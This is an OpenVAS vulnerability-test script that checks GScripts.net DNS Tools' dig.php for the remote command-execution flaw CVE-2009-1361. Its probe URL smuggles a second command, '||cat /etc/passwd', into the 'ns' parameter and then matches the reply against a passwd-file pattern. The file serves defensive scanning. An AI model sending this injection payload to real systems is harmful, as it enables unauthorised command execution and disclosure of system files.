###############################################################################
# OpenVAS Vulnerability Test
# $Id: GScripts_cve_2009_1361.nasl 15 2013-10-27 12:49:54Z jan $
#
# GScripts.net DNS Tools 'dig.php' Remote Command Execution
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "GScripts.net DNS Tools is prone to a remote command-execution
  vulnerability because the software fails to adequately sanitize
  user-supplied input.

  Successful attacks can compromise the affected software and possibly
  the computer.";


if (description)
{
 script_id(100182);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-05-02 19:46:33 +0200 (Sat, 02 May 2009)");
 script_bugtraq_id(34559);
 script_cve_id("CVE-2009-1361", "CVE-2009-1916");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");

 script_name("GScripts.net DNS Tools 'dig.php' Remote Command Execution Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if GScripts.net DNS Tools is vulnerable to remote command-execution");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34559");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/whois","/dns_tools", cgi_dirs());

foreach d (dir)
{ 
 url = string(d, "/dig.php?ns=||cat%20/etc/passwd&host=openvas.org&query_type=NS&status=digging");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( buf == NULL )continue;

 if (egrep(pattern:"root:.*:0:[01]:.*", string: buf) ) 
   {
     security_hole(port:port, data: desc);
     exit(0);    
   }
}

exit(0);
